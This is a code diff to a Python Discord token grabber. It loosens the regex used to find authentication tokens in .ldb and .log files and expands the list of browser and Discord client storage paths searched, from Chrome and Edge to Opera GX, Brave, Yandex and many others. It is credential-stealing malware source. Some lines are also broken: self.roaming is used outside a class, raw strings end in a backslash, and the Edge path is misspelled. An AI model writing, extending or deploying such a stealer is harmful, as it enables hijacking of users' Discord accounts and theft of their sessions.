@@ -27,7 +27,7 @@ def get_tokens(path):
     for file in [i for i in os.listdir(path) if i.endswith('.ldb') or i.endswith('.log')]:
         with open(f"{path}\\\\{file}", "r", errors='ignore') as file:
             for line in file.readlines():
-                for tkn in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', line.strip()):
+                for tkn in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line.strip()):
                     if tkn not in tokens:
                         tokens.append(tkn)
                 for tkn in re.findall(r'mfa\\.[\\w-]{84}', line.strip()):
@@ -40,15 +40,28 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 
 paths = {
-    'Discord': f"{roaming}\\\\Discord",
-    'Discord Canary': f"{roaming}\\\\discordcanary",
-    'Discord PTB': f"{roaming}\\\\discordptb",
-    'Google Chrome': f"{local}\\\\Google\\\\Chrome\\\\User Data\\\\Default",
-    'Opera': f"{roaming}\\\\Opera Software\\\\Opera Stable",
-    'Brave': f"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
-    'Yandex': f"{local}\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default",
-    "Brave" : f"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\",
-    "Vivaldi" : f"{local}\\\\Vivaldi\\\\User Data\\\\Default\\\\"
+    'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
+    'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+    'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+    'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
+    'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+    'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+    'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+    'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+    'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+    'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+    'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+    '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+    'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+    'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+    'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+    'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+    'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+    'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+    'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+    'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+    'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+    'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
 }
 
 grabbedTokens = {}
